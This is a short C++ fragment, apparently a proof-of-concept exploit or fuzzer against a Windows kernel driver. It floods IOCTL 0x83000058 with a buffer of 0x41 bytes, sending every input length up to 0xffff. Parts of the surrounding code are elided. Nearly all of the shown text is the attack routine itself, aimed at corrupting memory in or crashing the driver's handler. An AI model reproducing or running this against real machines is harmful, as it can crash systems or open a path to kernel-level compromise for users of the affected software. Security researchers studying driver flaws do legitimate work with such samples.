...
TCHAR szServiceName[] = _T("ServiceTest1");   
BOOL bInstall;   
...
void x83000058( )
{
	...
	DWORD nbBytes = 0;
	char*szBuf = new char[0x458 ];
	memset(szBuf, 0x41, 0x458 );

	*(DWORD *)szBuf = 0x5000;
	DeviceIoControl(m_handle, 0x83000058, (LPVOID)0,  0x0, (LPVOID)szBuf, 0x458 , &nbBytes, NULL);
	for (int iCount = 0; iCount < 0xffff; iCount++)
	{
		DeviceIoControl(m_handle, 0x83000058, (LPVOID)szBuf,  iCount, (LPVOID)szBuf, 0x458, &nbBytes, NULL);
	}
	delete[] szBuf;
